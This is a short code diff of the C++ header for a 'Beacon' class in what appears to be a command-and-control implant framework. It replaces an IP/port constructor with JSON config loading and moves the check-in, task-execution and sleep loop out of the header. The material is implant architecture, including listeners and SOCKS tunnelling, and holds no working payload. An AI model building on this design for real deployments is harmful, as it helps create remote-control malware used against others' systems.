@@ -20,49 +20,20 @@
 class Beacon
 {
 public:
-	Beacon(const std::string& ip, int port);
+	Beacon();
 	virtual ~Beacon(){};
 
-	void run()
-	{
-		bool exit = false;
-		while (!exit)
-		{
-			try 
-			{
-				checkIn();
+	bool initConfig(const std::string& config);
+	void run();
 
-				exit = runTasks();
-				
-				sleep();
-			}
-			catch(const std::exception& ex)
-			{
-				// std::cout << "Exeption " << std::endl;
-				// std::cout << "Exeption " << ex.what() << std::endl;
-				sleep();
-			}
-			catch (...) 
-			{
-				// std::cout << "Exeption" << std::endl;
-				sleep();
-			}
-		}
-
-		checkIn();
-	}
-
+protected:
 	virtual void  checkIn() = 0;
 	bool runTasks();
 	void sleep();
 
-protected:
 	bool execInstruction(C2Message& c2Message, C2Message& c2RetMessage);
 	bool cmdToTasks(const std::string& input);
 	bool taskResultsToCmd(std::string& output);
-
-	std::string m_ip;
-	int m_port;
 
 	int m_aliveTimerMs;
 
@@ -78,6 +49,8 @@ protected:
 
 private:
 	std::string m_key;
+	nlohmann::json m_modulesConfig;
+
 	std::vector<std::unique_ptr<ModuleCmd>> m_moduleCmd;
 	std::vector<std::unique_ptr<Listener>> m_listeners;
 	std::vector<std::unique_ptr<SocksTunnelClient>> m_socksTunnelClient;
